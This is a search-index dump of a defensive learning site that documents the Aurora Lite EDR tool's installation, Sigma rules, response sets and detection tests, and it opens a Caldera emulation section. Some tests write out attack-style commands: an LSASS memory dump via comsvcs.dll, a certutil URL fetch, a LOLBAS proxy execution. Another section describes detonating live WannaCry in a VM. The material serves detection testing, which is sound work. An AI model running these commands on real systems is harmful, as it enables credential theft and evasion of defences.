{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"Welcome to the Cyber Defence Kit","text":""},{"location":"index.html#introduction","title":"Introduction","text":"<p>The Cyber Defence Kit started as a personal exploration of open-source cybersecurity tools and evolved into a shared learning resource. Every step was documented\u2014proof-of-concept videos, detailed notes, lessons learned, and practical tips\u2014all shared online to make these tools more accessible and encourage learning. This project aims to inspire others to explore, implement, and understand the potential of open-source cybersecurity solutions.</p> <p></p>"},{"location":"index.html#getting-started","title":"Getting Started","text":"<p>To begin leveraging the Cyber Defence Kit:</p> <ol> <li>Understand the Toolkit:<ul> <li>Familiarise yourself with the components of the kit.</li> </ul> </li> <li>Set Up Your Environment:<ul> <li>Prepare your system by checking the hardware and software requirements before installation.</li> <li>Prepare your systems for installation (e.g., air-gapped environment considerations).</li> </ul> </li> <li>Learn and Explore:<ul> <li>Explore proof of concept videos and documentation on attack simulation.</li> </ul> </li> </ol>"},{"location":"index.html#important-notes","title":"Important Notes","text":"<ul> <li>Security First: Always follow security best practices when installing and configuring tools.</li> <li>Air-Gapped Environments: Special considerations are required for installations without internet access.</li> <li>Legal Compliance: Ensure all activities comply with legal and regulatory requirements.</li> </ul>"},{"location":"index.html#license","title":"License","text":"<p>Cyber Defence Kit documentation is created by Joseph Jee and licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License. You are free to share and adapt the content with proper attribution.</p>"},{"location":"CDK-explained/CDK-explained.html","title":"Cyber Defence Kit Explained","text":""},{"location":"CDK-explained/CDK-explained.html#why-is-cybersecurity-important","title":"Why is Cybersecurity Important?","text":"<p>In today\u2019s digital world, protecting information and systems from cyber threats is more important than ever. Cyber attacks can lead to:</p> <ul> <li>Loss of sensitive data \u2013 Private or confidential information could be stolen</li> <li>Operational disruptions \u2013 Day-to-day activities might be interrupted</li> <li>Damage to reputation \u2013 Trust from others could be affected</li> </ul>"},{"location":"CDK-explained/CDK-explained.html#real-world-context","title":"Real-World Context","text":"<p>New Zealand\u2019s National Cyber Security Centre (NCSC) has reported a steady increase in cyber incidents, including attempts to access sensitive information across both public and private sectors.</p>"},{"location":"CDK-explained/CDK-explained.html#what-is-the-cyber-defence-kit","title":"What is the Cyber Defence Kit?","text":"<p>The Cyber Defence Kit is a personal project focused on exploring how open-source tools can help improve cybersecurity. The aim is to:</p> <ul> <li>Strengthen protection using practical and accessible tools</li> <li>Improve threat detection through better visibility</li> <li>Automate responses to reduce the impact of incidents</li> <li>Encourage proactive security practices</li> <li>Share learning in a clear, easy-to-understand way</li> </ul>"},{"location":"CDK-explained/CDK-explained.html#what-tools-and-practices-are-involved","title":"What Tools and Practices Are Involved?","text":"<p>This project involves setting up and experimenting with tools that support stronger cyber defences. These include:</p>"},{"location":"CDK-explained/CDK-explained.html#advanced-monitoring","title":"Advanced Monitoring","text":"<p>Tools that observe network activity and raise alerts for anything unusual.</p>"},{"location":"CDK-explained/CDK-explained.html#automated-responses","title":"Automated Responses","text":"<p>Systems that carry out predefined actions to contain specific threats, reducing the need for manual input.</p>"},{"location":"CDK-explained/CDK-explained.html#incident-management","title":"Incident Management","text":"<p>A structured approach to investigating and responding to security events.</p>"},{"location":"CDK-explained/CDK-explained.html#endpoint-protection","title":"Endpoint Protection","text":"<p>Improved security for individual devices like laptops and servers, guarding against malware or unauthorised access.</p>"},{"location":"CDK-explained/CDK-explained.html#awareness-and-learning","title":"Awareness and Learning","text":"<p>Resources and walkthroughs to help others understand these tools and how they can be used in real-world scenarios.</p>"},{"location":"CDK-explained/CDK-explained.html#what-does-this-mean-for-you","title":"What Does This Mean for You?","text":"<p>If you\u2019re learning about cybersecurity or running your own lab, this project might be helpful by:</p> <ul> <li>Providing practical examples of how to detect and respond to threats</li> <li>Demonstrating how to use open-source tools effectively</li> <li>Sharing beginner-friendly notes, queries, and use cases</li> <li>Encouraging a hands-on, exploratory approach to learning</li> </ul>"},{"location":"CDK-explained/CDK-explained.html#using-plain-language","title":"Using Plain Language","text":"<ul> <li>Cyber threats \u2013 Malicious activity that targets computer systems or data</li> <li>Monitoring tools \u2013 Software that watches for anything unusual</li> <li>Automated responses \u2013 Pre-set actions that happen when a threat is detected</li> <li>Incident management \u2013 How security problems are addressed</li> <li>Endpoint protection \u2013 Security for devices like laptops, desktops, and smartphones</li> </ul>"},{"location":"CDK-explained/CDK-explained.html#why-this-matters","title":"Why This Matters","text":"<p>The Cyber Defence Kit is about taking simple but effective steps to:</p> <ul> <li>Protect information and systems</li> <li>Support learning and hands-on experience</li> <li>Promote responsible cybersecurity habits</li> <li>Stay one step ahead of potential threats</li> </ul>"},{"location":"CDK-explained/CDK-explained.html#summary","title":"Summary","text":"<p>The Cyber Defence Kit is a personal initiative to explore, learn, and share practical cybersecurity techniques. It\u2019s designed to make powerful tools and concepts more accessible and help others build confidence in defending against cyber threats.</p>"},{"location":"auroralite/auroralite.html","title":"Aurora Lite","text":"<p>Aurora Lite is a free Endpoint Detection and Response (EDR) tool that uses Sigma rules and Indicators of Compromise (IOCs) to detect and respond to threats in real time. It monitors system events through Windows Event Tracing (ETW) and can take automated actions, like suspending harmful processes. Though limited in advanced features, Aurora Lite is a powerful, cost-free solution for basic threat detection and response. Learn more at Nextron Systems.</p>"},{"location":"auroralite/auroralite.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, an attack simulation was conducted on a Windows Virtual Machine (VM) using live WannaCry ransomware within a secure and controlled environment. Aurora Lite was installed on the Windows VM to detect and respond to the attack.</p> <p>Note: Only use malware samples on systems you own and can restore, such as VMs with snapshots. Never execute malware on unauthorised systems. Always follow strict malware handling protocols and ensure simulations are conducted in secure, isolated environments. Do not attempt such activities without proper training and authorisation to avoid legal consequences and potential system damage.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) WS2019 Windows Server 2019 Aurora Lite 10.0.0.140 <p></p>"},{"location":"auroralite/auroralite.html#download-aurora-lite","title":"Download Aurora Lite","text":"<p>Navigate to https://www.nextron-systems.com/aurora/ and download Aurora Lite.</p> <p></p> <p>Submit your name and email address. It does not have to be your personal email address. </p> <p></p> <p>Check your inbox and confirm you email address.</p> <p></p> <p>Download your license and Aurora Lite. Note you will have to temporarily disable Windows defender to download Aurora Lite. </p> <p></p>"},{"location":"auroralite/auroralite.html#system-requirements","title":"System Requirements","text":"<p>Aurora is compatible with Windows 7 and later versions, but it requires administrator-level permissions to operate.</p> <p>It does not support alternative operating systems like Linux or macOS.</p>"},{"location":"auroralite/auroralite.html#supported-platforms","title":"Supported Platforms","text":"<ul> <li>Windows 7 (32-bit and 64-bit)</li> <li>Windows Server 2008 R2 (64-bit)</li> <li>Windows 8.1</li> <li>Windows Server 2012</li> <li>Windows Server 2012 R2</li> <li>Windows 10</li> <li>Windows 11</li> <li>Windows Server 2016</li> <li>Windows Server 2019</li> <li>Windows Server 2022</li> </ul>"},{"location":"auroralite/auroralite.html#update-servers","title":"Update Servers","text":"<p>An active internet connection is required to download the latest updates for Aurora and its signatures. The endpoint performing the update must have access to our update servers.</p> <p>For the most current and comprehensive list of our update and licensing servers, please visit: https://www.nextron-systems.com/resources/hosts/.</p>"},{"location":"auroralite/auroralite.html#setting-an-antivirus-edr-exclusion","title":"Setting an Antivirus / EDR Exclusion","text":"<p>It is advisable to configure your Antivirus or EDR solution to exclude Aurora. The exclusion paths will depend on your system architecture and whether Aurora was installed or executed interactively from a temporary directory.</p> <p>For an installed version of Aurora:</p> <pre><code>C:\\Program Files\\Aurora-Agent\\aurora-agent-64.exe\nC:\\Program Files\\Aurora-Agent\\aurora-agent.exe\n</code></pre> <p>For an interactively started Aurora, exclude the directory where it was extracted. For instance:</p> <pre><code>C:\\aurora\\aurora-agent-64.exe\nC:\\aurora\\aurora-agent.exe\n</code></pre>"},{"location":"auroralite/auroralite.html#running-aurora","title":"Running Aurora","text":"<p>You can run Aurora from your terminal using default values for each flag without requiring a dedicated configuration file:</p> <pre><code>aurora-agent-64.exe  \n</code></pre> <p>Alternatively, in the directory where Aurora Lite is extracted (e.g. <code>C:\\aurora</code>), double-click <code>aurora-agent-64</code> </p> <p></p> <p>Open PowerShell and run <code>whoami /groups</code></p> <p>Verify that Aurora generates alert <code>Sigma match found</code> with the title <code>Group Membership Reconnaissance via Whoami.EXE</code></p> <p></p> <p>To use a specific configuration preset, include the respective flag:</p> <pre><code>aurora-agent-64.exe -c agent-config-reduced.yml  \n</code></pre> <p>A typical command to run Aurora, which prints messages and matches to the terminal and the Windows Application Event Log, is:</p> <pre><code>aurora-agent-64.exe --minimum-level low  \n</code></pre>"},{"location":"auroralite/auroralite.html#running-aurora-as-a-service","title":"Running Aurora as a Service","text":"<p>To install Aurora as a service, use the <code>--install</code> flag. An example installation on systems with limited hardware resources (i.e. installing Aurora with the reduced preset) looks like this:</p> <pre><code>aurora-agent-64.exe --install -c agent-config-reduced.yml  \n</code></pre> <p>Aurora includes four configuration presets to suit various needs:</p> <ol> <li>Standard: <code>agent-config-standard.yml</code></li> <li>Reduced: <code>agent-config-reduced.yml</code></li> <li>Minimal: <code>agent-config-minimal.yml</code></li> <li>Intense: <code>agent-config-intense.yml</code></li> </ol> <p>The configuration presets have the following settings:</p> Affected Setting Minimal Reduced Standard Intense Deactivated Sources Registry, Raw Disk Access, Kernel Handles, Create Remote Thread, Process Access, Image Loads Registry, Raw Disk Access, Kernel Handles, Create Remote Thread, Process Access Registry, Raw Disk Access, Kernel Handles, Create Remote Thread CPU Limit 20 % 30 % 35 % 100 % Process Priority Low Normal Normal Normal Minimum Reporting Level High High Medium Low Deactivated Modules LSASS Dump Detector, BeaconHunter LSASS Dump Detector <p>Warning: The Intense preset consumes significant system resources and may heavily burden the system, particularly when a process rapidly accesses numerous registry keys.</p> <p>It is recommended to use this preset sparingly, either on a carefully chosen set of systems or in scenarios where maximum detection capability is essential.</p>"},{"location":"auroralite/auroralite.html#installing-aurora","title":"Installing Aurora","text":"<p>Extract the program package into a temporary folder (e.g., <code>C:\\aurora</code>).</p> <p>Place the license file (<code>.lic</code>) into the extracted folder.</p> <p>Open Command Prompt as an Administrator.</p> <p>Navigate to the extracted folder:</p> <pre><code>cd C:\\aurora\n</code></pre> <p>Run one of the following commands to install Aurora (with or without the GUI):</p> <pre><code>aurora-agent.exe --install \naurora-agent.exe --install --dashboard \n</code></pre> <p>After installation, the agent, configuration files, and rules will be located in:</p> <pre><code>C:\\Program Files\\Aurora Agent\\\n</code></pre> <p>All rule files in the <code>signatures\\sigma-rules</code> and <code>custom-signatures</code> subfolders are automatically copied.</p> <ul> <li>The <code>signatures\\sigma-rules</code> folder contains the latest open-source rules from the Sigma repository.</li> <li>The <code>custom-signatures</code> folder can be used to add your own Sigma rules.</li> </ul> <p>Check the local Application Event Log to verify the presence of new events related to the Aurora Agent.</p> <p></p> <p>Navigate to Aurora dashboard <code>http://localhost:17494/ui/dashboard/overview</code> on a web browser and confirm that the Aurora dashboard is accessible. </p> <p></p> <p>To check the current status of the agent, run the following commands:</p> <pre><code>aurora-agent.exe --status\naurora-agent.exe --status --trace\n</code></pre> <p>For testing Aurora\u2019s functionality, refer to the Function Tests section for ideas on validating its performance.</p>"},{"location":"auroralite/auroralite.html#custom-settings","title":"Custom Settings","text":"<p>For instructions on adding your own Sigma rules or Indicators of Compromise (IOCs), refer to the Manual Signature Management section. The recommended approach is to place these custom rules in the <code>custom-signatures</code> folder before installing Aurora.</p> <p>All flags used during installation (following <code>--install</code>) are saved in the configuration file named <code>agent-config.yml</code>, located in:</p> <pre><code>C:\\Program Files\\Aurora Agent\\\n</code></pre> <p>These settings are then applied by the Aurora service.</p> <p>A typical installation command with custom settings might look like this:</p> <pre><code>aurora-agent.exe --install --activate-responses\n</code></pre>"},{"location":"auroralite/auroralite.html#manual-signature-management","title":"Manual Signature Management","text":"<p>Signatures can be defined when starting Aurora by using the <code>--rules-path</code> and <code>--ioc-path</code> parameters. By default, these parameters point to:</p> <ul> <li>Built-in rules and IOCs: <code>signatures\\sigma-rules</code> and <code>signatures\\iocs</code></li> <li>Custom rules and IOCs: <code>custom-signatures\\sigma-rules</code> and <code>custom-signatures\\iocs</code></li> </ul> <p>Aurora will recursively traverse the specified directories and load all signature files it finds.</p> <p>To add new Sigma rules or IOCs, you can either:</p> <ol> <li>Place them in the appropriate subfolder within <code>custom-signatures</code>.</li> <li>Specify their location directly using the <code>-rules-path</code> or <code>-ioc-path</code> parameters.</li> </ol> <p>Warning: When using <code>--rules-path</code> or <code>--ioc-path</code>, if you wish to include Aurora\u2019s built-in rules and IOCs, you must explicitly add their paths as well. For example:</p> <pre><code>aurora-agent.exe --install --rules-path .\\signatures\\sigma-rules --rules-path .\\my-rules\n</code></pre> <p>If custom paths are configured, only the specified paths will be used.</p>"},{"location":"auroralite/auroralite.html#uninstalling-aurora","title":"Uninstalling Aurora","text":"<p>To uninstall the Aurora agent, simply execute the following command in an administrative terminal:</p> <pre><code>aurora-agent.exe --uninstall\n</code></pre> <p>If the uninstaller encounters errors and fails, you can manually remove Aurora using these commands:</p> <ol> <li> <p>Stop the Aurora service:</p> <pre><code>sc stop aurora-agent\n</code></pre> </li> <li> <p>Delete the service:</p> <pre><code>sc delete aurora-agent\n</code></pre> </li> <li> <p>Remove the program files:</p> <pre><code>rmdir /s /q \"C:\\Program Files\\Aurora-Agent\"\n</code></pre> </li> <li> <p>Delete scheduled tasks:</p> <pre><code>schtasks /Delete /F /TN aurora-agent-program-update\nschtasks /Delete /F /TN aurora-agent-signature-update\n</code></pre> </li> </ol>"},{"location":"auroralite/auroralite.html#responses","title":"Responses","text":"<p>Responses in Aurora agents are an enhancement to the Sigma standard. They enable the agent to take specific actions when a Sigma rule is matched, providing an immediate response to identified events. This functionality can be effective in containing threats or minimising potential damage. However, improper use can cause significant issues.</p> <p>Caution:</p> <p>Responses should only be applied in scenarios where you are completely confident that the rule will not trigger false positives. Custom actions must be thoroughly tested before deployment.</p> <p>Intended Use Cases:</p> <ul> <li>Containing worm outbreaks</li> <li>Ransomware mitigation</li> <li>Enforcing strict blocking of specific tool usage (for broader control, consider using AppLocker).</li> </ul>"},{"location":"auroralite/auroralite.html#types-of-actions","title":"Types of Actions","text":"<p>The Aurora agent supports two categories of responses:</p> <ul> <li>Predefined</li> <li>Custom</li> </ul> <p>Actions can include a predefined set of responses or custom commands, as illustrated below.</p>"},{"location":"auroralite/auroralite.html#predefined-responses","title":"Predefined Responses","text":"<ul> <li><code>suspend</code>: Temporarily suspends the target process.</li> <li><code>kill</code>: Terminates the target process.</li> <li><code>dump</code>: Generates a dump file in the folder specified by the <code>dump-path</code> configuration.</li> </ul>"},{"location":"auroralite/auroralite.html#response-flags","title":"Response Flags","text":"<p>Responses in Aurora can be customised using various flags defined in the YAML configuration as key-value pairs. The available response flags are as follows:</p> <p>Simulate</p> <p>The <code>simulate</code> flag ensures that no response is triggered upon a match. Instead, a log entry is created to indicate which response would have been executed. This mimics the behaviour when <code>--activate-responses</code> is not set.</p> <ul> <li>Supported for all responses.</li> </ul> <p>Recursive</p> <p>The <code>recursive</code> flag extends the response to include all child and descendant processes of the targeted process.</p> <ul> <li>Supported for predefined responses.</li> <li>Default value: <code>true</code>.</li> </ul> <p>Low Privilege Only</p> <p>The <code>lowprivonly</code> flag ensures that a response is triggered only if the target process is not running as <code>LOCAL SYSTEM</code> or another elevated privilege.</p> <ul> <li>Supported for predefined responses.</li> <li>Default value: <code>true</code>.</li> </ul> <p>Ancestor</p> <p>The <code>ancestors</code> flag allows the response to target an ancestor of the process instead of the process itself.</p> <ul> <li><code>ancestors: 1</code> targets the parent process.</li> <li><code>ancestors: 2</code> targets the grandparent process, and so on.</li> <li><code>ancestors: all</code> applies the response to all ancestors up to the first invalid ancestor (determined by the <code>lowprivonly</code> flag).</li> <li>Supported for predefined responses.</li> <li>Default value: <code>0</code> (no ancestor targeted).</li> </ul> <p>Process ID Field</p> <p>The <code>processidfield</code> flag specifies the field containing the process ID of the target process.</p> <ul> <li>Supported for predefined responses.</li> <li>Default value: <code>ProcessId</code>.</li> </ul>"},{"location":"auroralite/auroralite.html#specifying-a-response-for-a-sigma-rule","title":"Specifying a Response for a Sigma Rule","text":"<p>Aurora allows responses to be defined for Sigma rules in two ways, each with its own benefits and drawbacks.</p>"},{"location":"auroralite/auroralite.html#inline-responses","title":"Inline Responses","text":"<p>Responses can be embedded directly within a Sigma rule.</p> <ul> <li>Advantages:<ul> <li>Useful for testing purposes.</li> <li>Keeps the response and rule in a single file for simplicity.</li> </ul> </li> <li>Disadvantages:<ul> <li>Less flexible since the same response will be active on all systems where the rule is deployed.</li> <li>Difficult to list all active responses.</li> </ul> </li> </ul> <p>Example of a Sigma Rule with Inline Response:</p> <pre><code>title: Example rule with inline response  \nlogsource:  \n   product: windows  \n   category: process_creation  \ndetection:  \n   selection:  \n      Image|endswith: '\\example.exe'  \n   condition: selection  \nresponse:  \n   type: predefined  \n   action: kill  \n</code></pre>"},{"location":"auroralite/auroralite.html#response-sets","title":"Response Sets","text":"<p>Responses can also be defined in a separate response set file.</p> <ul> <li>Advantages:<ul> <li>Allows centralised management of responses.</li> <li>Responses can be customised for specific systems or environments.</li> <li>Easier to update and track active responses.</li> </ul> </li> <li>Usage:<ul> <li>A response set file includes a response definition and a list of rule IDs to which the response applies.</li> <li>Multiple response set files can be provided during startup using the <code>-response-set</code> option.</li> </ul> </li> <li>Priority:<ul> <li>If a rule has responses defined inline and in response sets, the response from the last-specified response set takes precedence.</li> </ul> </li> </ul> <p>Example of a Response Set File:</p> <pre><code>description: My example response set  \nresponse:  \n   type: predefined  \n   action: kill  \n   lowprivonly: true  \n   ancestors: all  \nrule-ids:  \n   - '87df9ee1-5416-453a-8a08-e8d4a51e9ce1'  # Delete Volume Shadow Copies Via WMI  \n   - 'ae9c6a7c-9521-42a6-915e-5aaa8689d529'  # CobaltStrike Load by Rundll32  \n</code></pre>"},{"location":"auroralite/auroralite.html#introduction-to-aurora-lite","title":"Introduction to Aurora Lite","text":""},{"location":"auroralite/auroralite.html#performing-function-tests","title":"Performing Function Tests","text":"<p>There are straightforward methods to test Aurora and confirm its ability to detect suspicious or malicious events.</p>"},{"location":"auroralite/auroralite.html#sigma-matching-process-creation","title":"Sigma Matching - Process Creation","text":"<p>Included in profiles: Minimal, Reduced, Standard, Intense</p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>whoami /priv\n</code></pre> <p></p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>certutil.exe -urlcache http://test.com\n</code></pre> <p>This actually created a <code>notice</code> level message with level <code>medium</code> on Windows Server 2019</p> <p></p>"},{"location":"auroralite/auroralite.html#sigma-matching-network-communication","title":"Sigma Matching - Network Communication","text":"<p>Included in profiles: Minimal, Reduced, Standard, Intense</p> <p>This should create an\u00a0<code>alert</code>\u00a0level message for a Sigma rule with level\u00a0<code>critical</code>.</p> <pre><code>ping aaa.stage.123456.test.com\n</code></pre> <p></p>"},{"location":"auroralite/auroralite.html#sigma-matching-file-creation","title":"Sigma Matching - File Creation","text":"<p>Included in profiles: Minimal, Reduced, Standard, Intense</p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>echo \"test\" &gt; %temp%\\lsass.dmp\n</code></pre> <p></p>"},{"location":"auroralite/auroralite.html#sigma-matching-process-access","title":"Sigma Matching - Process Access","text":"<p>Included in profiles: Standard, Intense</p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>#PowerShell\n$id = Get-Process lsass; rundll32.exe C:\\Windows\\System32\\comsvcs.dll , MiniDump $id.Id $env:temp\\lsass.dmp full\n</code></pre> <p></p> <p>Cleanup:</p> <pre><code>Remove-Item \"$env:temp\\lsass.dmp\" -Force\n</code></pre>"},{"location":"auroralite/auroralite.html#sigma-matching-registry","title":"Sigma Matching - Registry","text":"<p>Included in profiles: Intense</p> <p>This should create a\u00a0<code>warning</code>\u00a0level message for a Sigma rule with level\u00a0<code>high</code>.</p> <pre><code>reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AuroraTest\" /V \"AuroraTest\" /t REG_SZ /F /D \"vbscript\"\n</code></pre> <p>This did not generate any alert on Windows Server 2019 despite using the Intense preset.</p> <p>Cleanup:</p> <pre><code>reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AuroraTest\" /F\n</code></pre>"},{"location":"auroralite/auroralite.html#ioc-matching-filenames","title":"IOC Matching - Filenames","text":"<p>This should create a\u00a0<code>notice</code> level message for a Sigma rule with the name filename IOC match found. </p> <pre><code>echo \"test\" &gt; \"$env:TEMP\\loader.ps1\"\n</code></pre> <p></p> <p>Cleanup:</p> <pre><code>del $env:TEMP\\loader.ps1\n</code></pre>"},{"location":"auroralite/auroralite.html#ioc-matching-c2","title":"IOC Matching - C2","text":"<p>This should create a\u00a0<code>alert</code> level message for a Sigma rule with the name C2 IOC match found. </p> <pre><code>ping drivers-update.info\n</code></pre> <p></p>"},{"location":"auroralite/auroralite.html#ioc-matching-named-pipe","title":"IOC Matching - Named Pipe","text":"<p>Start a named pipe using the following PowerShell commands:</p> <pre><code>$npipeServer = New-Object System.IO.Pipes.NamedPipeServerStream('testPipe', [System.IO.Pipes.PipeDirection]::InOut)\n$npipeServer.Close()\n</code></pre> <p>This should create a\u00a0<code>alert</code> level message for a Sigma rule with the title Malicious Named Pipe Created. </p> <p></p> <p>Included in profiles: Intense</p>"},{"location":"auroralite/auroralite.html#ioc-matching-mutex","title":"IOC Matching - Mutex","text":"<p>Create a mutex using the following PowerShell commands:</p> <pre><code>$mtx = New-Object System.Threading.Mutex($true, \"agony\")\n</code></pre> <p>Matching might take some time (outside of the Intense profile) since mutexes are polled.</p> <p>This did not generate any alert on Windows Server 2019 despite using the Intense preset. ****</p> <p>Note: The Aurora Lite version uses only a very limited set of IOCs.</p>"},{"location":"auroralite/auroralite.html#living-off-the-land-binaries-and-scripts-lolbas","title":"Living Off the Land Binaries and Scripts (LOLBAS)","text":"<p>LOLBAS (Living Off the Land Binaries and Scripts) refers to using legitimate, pre-installed tools and utilities on a system to perform potentially malicious actions while evading detection by security systems. </p> <p>In this case, <code>Scriptrunner.exe</code> is a legitimate utility that is being used as a \"proxy\" to indirectly execute another program (<code>calc.exe</code>). This technique helps bypass security measures that might flag or block direct execution of certain programs, as the execution appears to originate from a trusted utility. This approach requires only basic user privileges and works on various versions of Windows.</p> <p>Run the following command: </p> <pre><code>Scriptrunner.exe -appvscript calc.exe\n</code></pre> <p>This should create a\u00a0<code>notice</code>\u00a0level message for a Sigma rule with level\u00a0<code>medium</code>.</p> <p></p>"},{"location":"auroralite/auroralite.html#activating-response-sets","title":"Activating Response Sets","text":""},{"location":"auroralite/auroralite.html#suspending-notepad-process","title":"Suspending Notepad Process","text":"<p>The objective is to verify that Aurora Lite can suspend a simple process.</p> <p>Create a simple Sigma rule to detect Notepad. Save the following Sigma rule as <code>proc_creation_notepad.yml</code> in <code>C:\\aurora\\custom-signatures\\sigma-rules</code>:</p> <pre><code>title: Detect Notepad Execution\nid: test-notepad-rule\nstatus: test\ndescription: Detects when notepad.exe is started.\ntags:\n    - testing\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\notepad.exe'\n    condition: selection\nfalsepositives:\n    - None\nlevel: medium\n</code></pre> <p>Create a response set to suspend the Notepad process. Save the following response set as <code>test_notepad.yml</code> in <code>C:\\aurora\\response-sets</code>:</p> <pre><code>description: Suspend Notepad process for testing\nresponse:\n    type: predefined\n    action: suspend\n    lowprivonly: false\n    ancestors: 0\n    recursive: false\nrule-ids:\n    - 'test-notepad-rule'\n</code></pre> <p>Install and activate your <code>test_notepad.yml</code> response set using Aurora Lite:</p> <pre><code>aurora-agent.exe --install --response-set c:\\aurora\\response-sets\\test_notepad.yml --activate-responses\n</code></pre> <p></p> <p>Ensure <code>test_notepad.yml</code> is located in <code>C:\\Program Files\\Aurora-Agent\\response-sets</code> and <code>proc_creation_notepad.yml</code> is in <code>C:\\Program Files\\Aurora-Agent\\custom-signatures\\sigma-rules</code>.</p> <p>Next, open Task Manager and Notepad. Verify that Notepad (notepad.exe) is instantly suspended.</p> <p></p>"},{"location":"auroralite/auroralite.html#detonating-wannacry-ransomware","title":"Detonating WannaCry Ransomware","text":"<p>The WannaCry Ransomware sample is available from this GitHub repository, which hosts live malware samples designed for the Practical Malware Analysis &amp; Triage (PMAT) course.</p> <p>The repository includes both real-world malware captured in the wild and samples crafted to mimic typical malware behaviour. These are highly dangerous and require careful handling.</p> <p>Important precautions:</p> <ul> <li>Only download or run these samples on machines you own.</li> <li>Always use a virtual machine with snapshots to ensure the system can be restored to a clean state.</li> <li>Follow strict malware safety protocols while working with these samples.</li> </ul> <p>Create a snapshot of the system in its pre-detonation state, ensuring the internet connection is disabled. Copy the file <code>cosmo.jpeg</code> to the desktop before proceeding. Execute the WannaCry ransomware and monitor its behaviour.</p> <p>Initially, you will observe processes such as <code>Ransomware.wannacry.exe</code>, <code>taskhsvc.exe</code>, and <code>tasksche.exe</code> running in Task Manager. After a short time, the process <code>@WanaDecryptor@.exe</code> will also appear. Key symptoms of the infection include:</p> <ul> <li>The desktop wallpaper changes.</li> <li>A program window opens, displaying a countdown timer, ransom demand, and payment options.</li> <li>Files on the system are encrypted with the <code>.WNCRY</code> extension.</li> <li>Two new files appear on the desktop: <code>@WanaDecryptor@</code> (executable) and <code>@Please_Read_Me@</code> (text file).</li> </ul> <p>After completing your observations, revert the system to its pre-detonation snapshot to restore its original state.</p> <p></p> <p></p> <p></p>"},{"location":"auroralite/auroralite.html#suspending-wannacry-processes","title":"Suspending WannaCry Processes","text":"<p>Create a Sigma Rule and Response Set for WannaCry</p> <p>Create a Sigma rule to detect the WannaCry Ransomware. Save the following Sigma rule as <code>proc_creation_wannacry.yml</code> in <code>C:\\aurora\\custom-signatures\\sigma-rules</code>:</p> <pre><code>title: Detect WannaCry Processes\nid: wannacry-detection-rule\nstatus: test\ndescription: Detects processes associated with WannaCry ransomware.\ntags:\n    - ransomware\n    - wannacry\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\taskhsvc.exe'\n            - '\\tasksche.exe'\n    condition: selection\nfalsepositives:\n    - None\nlevel: high\n</code></pre> <p>Create a response set to suspend WannaCry processes. Save the following response set as <code>suspend_wannacry.yml</code> in <code>C:\\aurora\\response-sets</code>:</p> <pre><code>description: Suspend WannaCry processes for testing and containment\nresponse:\n    type: predefined\n    action: suspend\n    lowprivonly: false\n    ancestors: 0\n    recursive: false\nrule-ids:\n    - 'wannacry-detection-rule'\n</code></pre> <p>Note: The suspend action temporarily halts the targeted process, while the kill action terminates it. For demonstration purposes, we used suspend since it allows you to visually verify the process status in Task Manager. In a real-world scenario, the kill action would typically be more appropriate to immediately neutralise the threat.</p> <p>Use the Aurora Lite agent to install and activate the response set with the following command:</p> <pre><code>aurora-agent.exe --install --response-set c:\\aurora\\response-sets\\suspend_wannacry.yml --activate-responses\n</code></pre> <p>Ensure the following:</p> <ul> <li><code>suspend_wannacry.yml</code> is located in <code>C:\\Program Files\\Aurora-Agent\\response-sets</code>.</li> <li><code>proc_creation_wannacry.yml</code> is located in <code>C:\\Program Files\\Aurora-Agent\\custom-signatures\\sigma-rules</code>.</li> </ul> <p>Execute the WannaCry ransomware, ensuring the internet is disconnected. </p> <p>Open Task Manager and verify that the <code>tasksche.exe</code> process is suspended. Please note that it may take some time for the <code>tasksche.exe</code> process to appear as suspended in Task Manager.</p> <p></p> <p>Verify that a Sigma rule match is identified for WannaCry ransomware activity in the Windows Event Log under the Application category.</p> <p></p> <p>Revert the VM to its pre-detonation snapshot to remove any changes made by WannaCry ransomware.</p>"},{"location":"auroralite/auroralite.html#references","title":"References","text":"<ul> <li>https://aurora-agent-manual.nextron-systems.com/en/latest/index.html</li> <li>https://youtu.be/R3fFzYXKn3c?si=ztsyE9ee99DWL0MQ</li> <li>https://youtu.be/ExVpIwvEihA?si=tGiE90181bGSfXI-</li> <li>https://github.com/SigmaHQ/sigma</li> <li>https://github.com/HuskyHacks/PMAT-labs</li> </ul>"},{"location":"caldera/caldera.html","title":"Caldera","text":"<p>Caldera is a cybersecurity platform designed to automate adversary emulation, support red team operations, and streamline incident response.</p> <p>Built on the MITRE ATT&amp;CK framework, Caldera is an ongoing research project at MITRE. It consists of two key components:</p> <ol> <li>Core System \u2013 The main framework, available in this repository, includes an asynchronous command-and-control (C2) server with a REST API and a web interface.</li> <li>Plugins \u2013 Extend the framework\u2019s capabilities, adding functionality such as agents, reporting, and collections of TTPs.</li> </ol>"},{"location":"caldera/caldera.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, an attack simulation was conducted on Ubuntu and Windows virtual machines (VMs) within a secure and controlled environment. Caldera was installed on the Ubuntu VM to automate adversary emulation.</p> <p>Note: Do not attempt to replicate the attack emulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack emulation can result in legal consequences and unintended damage to systems. Always ensure that such activities are carried out by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.10 (WAN) / 10.0.0.1 (LAN) Caldera Ubuntu 24.04 Caldera Server 10.0.0.100 Ubuntu Ubuntu 24.04 Caldera Linux Agent 10.0.0.200 WS2019 Windows Server 2019 Caldera Windows 